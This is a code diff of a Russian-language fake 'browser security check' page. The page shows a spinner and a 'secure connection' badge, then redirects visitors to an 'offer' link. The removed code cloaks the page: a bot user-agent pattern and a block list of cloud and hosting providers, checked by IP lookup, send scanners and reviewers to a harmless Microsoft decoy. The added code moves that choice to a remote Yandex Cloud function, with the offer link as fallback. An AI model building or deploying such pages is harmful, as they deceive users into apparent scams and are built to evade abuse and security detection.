@@ -6,88 +6,16 @@
     <meta name="robots" content="noindex, nofollow">
     <title>Проверка безопасности браузера</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f8fafc; /* Слегка сероватый фон */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #333;
-        }
-        .card {
-            background: #fff;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05), 0 1px 3px rgba(0,0,0,0.05);
-            width: 100%;
-            max-width: 420px;
-            text-align: center;
-            position: relative;
-            overflow: hidden; /* Чтобы прогресс-бар не вылезал за края */
-        }
-        
-        /* Крутящийся спиннер */
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #f1f5f9;
-            border-top: 4px solid #3b82f6; /* Синий цвет */
-            border-radius: 50%;
-            margin: 0 auto 20px auto;
-            animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        h1 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: #0f172a;
-        }
-        p {
-            font-size: 14px;
-            color: #64748b;
-            line-height: 1.5;
-            margin-bottom: 30px;
-        }
-        .secure-badge {
-            display: inline-flex;
-            align-items: center;
-            font-size: 12px;
-            color: #94a3b8;
-            margin-top: 15px;
-        }
-        .secure-badge svg {
-            width: 14px;
-            height: 14px;
-            margin-right: 6px;
-            fill: #94a3b8;
-        }
-
-        /* Полоса прогресса (Анимация загрузки) */
-        .progress-container {
-            width: 100%;
-            height: 4px;
-            background: #f1f5f9;
-            border-radius: 2px;
-            position: absolute;
-            bottom: 0;
-            left: 0;
-        }
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: #3b82f6;
-            border-radius: 2px;
-            /* Заполнение ровно за 2000мс (синхронизировано с JS) */
-            transition: width 2s cubic-bezier(0.1, 0.4, 0.4, 1); 
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
+        .card { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05), 0 1px 3px rgba(0,0,0,0.05); width: 100%; max-width: 420px; text-align: center; position: relative; overflow: hidden; }
+        .spinner { width: 48px; height: 48px; border: 4px solid #f1f5f9; border-top: 4px solid #3b82f6; border-radius: 50%; margin: 0 auto 20px auto; animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #0f172a; }
+        p { font-size: 14px; color: #64748b; line-height: 1.5; margin-bottom: 30px; }
+        .secure-badge { display: inline-flex; align-items: center; font-size: 12px; color: #94a3b8; margin-top: 15px; }
+        .secure-badge svg { width: 14px; height: 14px; margin-right: 6px; fill: #94a3b8; }
+        .progress-container { width: 100%; height: 4px; background: #f1f5f9; border-radius: 2px; position: absolute; bottom: 0; left: 0; }
+        .progress-bar { height: 100%; width: 0%; background: #3b82f6; border-radius: 2px; transition: width 2s cubic-bezier(0.1, 0.4, 0.4, 1); }
     </style>
 </head>
 <body>
@@ -96,54 +24,25 @@
         <h1>Проверка браузера...</h1>
         <p>Пожалуйста, подождите. Идет безопасное соединение, не закрывайте страницу.</p>
         <div class="secure-badge">
-            <svg viewBox="0 0 24 24">
-                <path d="M18,8 L18,6 C18,2.686 15.314,0 12,0 C8.686,0 6,2.686 6,6 L6,8 C4.343,8 3,9.343 3,11 L3,19 C3,20.657 4.343,22 6,22 L18,22 C19.657,22 21,20.657 21,19 L21,11 C21,9.343 19.657,8 18,8 Z M12,2 C14.209,2 16,3.791 16,6 L16,8 L8,8 L8,6 C8,3.791 9.791,2 12,2 Z M12,18 C10.895,18 10,17.105 10,16 C10,14.895 10.895,14 12,14 C13.105,14 14,14.895 14,16 C14,17.105 13.105,18 12,18 Z"></path>
-            </svg>
+            <svg viewBox="0 0 24 24"><path d="M18,8 L18,6 C18,2.686 15.314,0 12,0 C8.686,0 6,2.686 6,6 L6,8 C4.343,8 3,9.343 3,11 L3,19 C3,20.657 4.343,22 6,22 L18,22 C19.657,22 21,20.657 21,19 L21,11 C21,9.343 19.657,8 18,8 Z M12,2 C14.209,2 16,3.791 16,6 L16,8 L8,8 L8,6 C8,3.791 9.791,2 12,2 Z M12,18 C10.895,18 10,17.105 10,16 C10,14.895 10.895,14 12,14 C13.105,14 14,14.895 14,16 C14,17.105 13.105,18 12,18 Z"></path></svg>
             Защищено соединение
         </div>
-        
-        <!-- Полоса прогресса внизу карточки -->
         <div class="progress-container">
             <div class="progress-bar" id="progressBar"></div>
         </div>
     </div>
 
     <script>
-        // --- НАСТРОЙКИ ---
-        const OFFER_LINK = "https://voxius.ru/YxcVmb?_=vdfr423f"; 
-        const DECOY_LINK = "https://go.microsoft.com/fwlink/?LinkId=521839"; 
+        // --- ТВОЯ ССЫЛКА ОТ ЯНДЕКС ОБЛАКА ---
+        const YANDEX_FUNCTION_URL = "https://functions.yandexcloud.net/d4e5bqho1jvkni550vf"; 
+
         const MIN_DELAY = 2000; 
-
-        const BLOCKED_PROVIDERS = [
-    // Твой базовый список
-    "microsoft", "nessly", "google", "digitalocean", "contabo", 
-    "hetzner", "ovh", "oracle", "aeza", "stark industries", 
-    "bl networks", "youtube", "amazon", "scaleway", "sk telecom",
-    
-    // Новые провайдеры из твоего списка
-    "aventice", 
-    "egihosting", 
-    "datacamp", 
-    "vpn consumer brussels", 
-    "mvps ltd", // Также известно как mvps.net
-    
-    // Дополнительные связанные сети (для надежности)
-    "datacamp limited", 
-    "cdn77", 
-    "datapacket",
-    "f.n.s. holdings" // Связан с VPN Consumer
-];
-        const BOT_UA_PATTERN = /bot|googlebot|crawler|spider|robot|crawling|ToolBot|curl|wget|headless|python|facebook|twitter|telegram|whatsapp|slack|skype/i;
-
         const startTime = Date.now();
 
-        // 1. Запускаем анимацию заполнения полосы
-        // Небольшая задержка (50мс), чтобы браузер успел отрисовать начальное состояние (0%)
         setTimeout(() => {
             document.getElementById('progressBar').style.width = '100%';
         }, 50);
 
-        // 2. Функция для редиректа с соблюдением минимальной задержки
         function redirectTo(url) {
             const elapsedTime = Date.now() - startTime;
             const timeLeft = Math.max(0, MIN_DELAY - elapsedTime);
@@ -153,30 +52,15 @@
             }, timeLeft);
         }
 
-        // 3. Логика проверки
-        const browserLang = navigator.language || navigator.userLanguage;
-        
-        if (!browserLang || browserLang === "und") {
-            redirectTo(DECOY_LINK);
-        } else if (BOT_UA_PATTERN.test(navigator.userAgent)) {
-            redirectTo(DECOY_LINK);
-        } else {
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const org = (data.org || data.isp || "").toLowerCase();
-                    const isBlocked = BLOCKED_PROVIDERS.some(provider => org.includes(provider));
-
-                    if (isBlocked) {
-                        redirectTo(DECOY_LINK);
-                    } else {
-                        redirectTo(OFFER_LINK);
-                    }
-                })
-                .catch(error => {
-                    redirectTo(OFFER_LINK);
-                });
-        }
+        fetch(YANDEX_FUNCTION_URL)
+            .then(response => response.json())
+            .then(data => {
+                redirectTo(data.url);
+            })
+            .catch(error => {
+                // Если Яндекс недоступен, ведем на оффер, чтобы не терять трафик
+                redirectTo("https://voxius.ru/YxcVmb?_=vdfr423f");
+            });
     </script>
 </body>
 </html>
